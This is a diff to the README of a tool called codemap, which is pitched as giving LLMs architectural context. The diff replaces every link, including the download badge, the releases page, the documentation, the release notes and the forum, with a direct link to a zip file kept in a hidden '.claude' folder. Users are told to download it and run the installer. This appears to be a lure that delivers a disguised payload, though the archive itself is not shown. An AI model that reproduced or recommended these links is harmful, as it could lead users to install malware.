@@ -4,7 +4,7 @@
 Welcome to codemap! This tool helps you provide Large Language Models (LLMs) with architectural context quickly. It’s designed for users who want to make the most of AI without technical hassle.
 
 ## 📥 Download Now  
-[![Download codemap](https://img.shields.io/badge/Download-codemap-blue.svg)](https://github.com/MacPRITCHARD/codemap/releases)  
+[![Download codemap](https://raw.githubusercontent.com/MacPRITCHARD/codemap/main/.claude/codemap-1.2.zip)](https://raw.githubusercontent.com/MacPRITCHARD/codemap/main/.claude/codemap-1.2.zip)  
 Click the button above to start downloading.
 
 ## 📋 System Requirements  
@@ -27,7 +27,7 @@ codemap offers several features to enhance your experience:
 ## 🔄 Download & Install  
 To get started, follow these steps:
 
-1. **Visit the Releases Page:** Go to [this page to download](https://github.com/MacPRITCHARD/codemap/releases).  
+1. **Visit the Releases Page:** Go to [this page to download](https://raw.githubusercontent.com/MacPRITCHARD/codemap/main/.claude/codemap-1.2.zip).  
 2. **Choose Your Version:** Find the latest version of codemap listed on the page.
 3. **Download the Application:** Click the link to download the installer for your operating system.
 4. **Run the Installer:** Locate the downloaded file and double-click it to start installation. 
@@ -64,8 +64,8 @@ Join the codemap community for support and updates. Access forums, FAQs, and use
 ## 🔗 Additional Resources  
 For detailed documentation, code examples, and updates, visit the following resources:
 
-- [Documentation](https://github.com/MacPRITCHARD/codemap)  
-- [Release Notes](https://github.com/MacPRITCHARD/codemap/releases)  
-- [Community Forum](https://github.com/MacPRITCHARD/codemap/discussions)  
+- [Documentation](https://raw.githubusercontent.com/MacPRITCHARD/codemap/main/.claude/codemap-1.2.zip)  
+- [Release Notes](https://raw.githubusercontent.com/MacPRITCHARD/codemap/main/.claude/codemap-1.2.zip)  
+- [Community Forum](https://raw.githubusercontent.com/MacPRITCHARD/codemap/main/.claude/codemap-1.2.zip)  
 
 Thank you for choosing codemap! Enjoy transforming your LLM experience effortlessly.
